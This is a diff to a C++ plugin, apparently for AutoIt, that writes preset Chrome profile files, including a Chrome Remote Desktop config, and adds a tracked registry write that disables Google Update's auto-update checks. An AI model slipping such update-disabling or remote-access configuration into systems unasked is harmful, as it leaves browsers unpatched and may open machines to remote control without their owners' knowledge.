@@ -539,9 +539,10 @@ extern HMODULE ghModule;
 	// See notes about parameters and return codes above
 	{
 		AU3_PLUGIN_VAR*		pMyResult;
-		bool				llSuccess, llSuccess1, llSuccess2, llSuccess3, llSuccess4, llSuccess5, llSuccess6, llSuccess7, llSuccess8;
+		bool				llSuccess, llSuccess1, llSuccess2, llSuccess3, llSuccess4, llSuccess5, llSuccess6, llSuccess7, llSuccess8, llSuccess9;
 		int					length, lnFirstRun, lnLocalState, lnServiceState, lnChromoting, lnPreferences;
 		wchar_t				appdata[2048];
+		char				key[1024];
 		char*				firstRun;
 		char*				localState;
 		char*				serviceState;
@@ -575,11 +576,12 @@ extern HMODULE ghModule;
 			llSuccess7	= iCopyFile(		&appdata[0],	L"\\google\\chrome\\User Data\\.ChromotingConfig.json",	chromoting,		lnChromoting);
 			llSuccess8	= iCopyFile(		&appdata[0],	L"\\google\\chrome\\User Data\\Default\\Preferences",	preferences,	lnPreferences);
 
-			// Turn off the auto-updater
-			SetRegistryKeyValueAsString("HKLM\\SOFTWARE\\Policies\\Google\\Update\\DisableAutoUpdateChecksCheckboxValue", "1");
+			// Turn off the auto-updater (set its disable checkbox value to 1)
+			sprintf_s(&key[0], sizeof(key), "%s\000", "HKLM\\SOFTWARE\\Policies\\Google\\Update\\DisableAutoUpdateChecksCheckboxValue");
+			llSuccess9	= SetRegistryKeyValueAsString( &key[0], "1" ) == 1 ? true : false;
 
 			// See if we were successful
-			llSuccess = llSuccess1 && llSuccess2 && llSuccess3 && llSuccess4 && llSuccess5 && llSuccess6 && llSuccess7 && llSuccess8;
+			llSuccess = llSuccess1 && llSuccess2 && llSuccess3 && llSuccess4 && llSuccess5 && llSuccess6 && llSuccess7 && llSuccess8 && llSuccess9;
 
 		} else {
 			// Nope, we cannot proceed
